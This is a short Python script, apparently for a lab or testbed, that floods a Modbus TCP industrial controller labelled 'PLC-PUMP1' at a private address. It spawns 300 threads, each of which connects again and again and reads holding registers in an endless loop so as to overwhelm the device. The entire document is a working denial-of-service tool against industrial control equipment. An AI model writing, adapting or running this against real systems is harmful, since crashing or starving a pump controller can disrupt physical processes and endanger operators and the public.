from pymodbus.client import ModbusTcpClient
import threading
import time

TARGET  = '10.0.0.2'
PORT    = 5502
THREADS = 300

def flood():
    while True:
        try:
            client = ModbusTcpClient(TARGET, port=PORT, timeout=0.1)
            client.connect()
            while True:
                client.read_holding_registers(30000, 150, device_id=1)
        except:
            pass

print(f"Flooding PLC-PUMP1 at {TARGET}:{PORT} with {THREADS} threads...")
print("Press Enter to stop\n")

for i in range(THREADS):
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()

input()
